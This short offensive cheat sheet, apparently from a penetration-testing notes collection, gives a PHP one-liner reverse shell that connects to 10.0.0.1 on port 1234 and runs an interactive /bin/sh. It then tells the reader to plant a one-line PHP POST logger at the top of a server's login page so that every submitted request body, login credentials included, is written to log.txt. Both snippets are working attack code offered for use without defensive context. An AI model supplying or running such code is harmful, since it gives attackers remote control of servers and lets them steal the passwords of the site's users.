### Reverse shell in PHP
```php
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## post request logger

You can edit a login page from the webserver which handles post request and user authentication.
Put this post request logger in top so it's will log every post request into *log.txt*
```php
<?php file_put_contents('log.txt', file_get_contents('php://input')); ?>
```
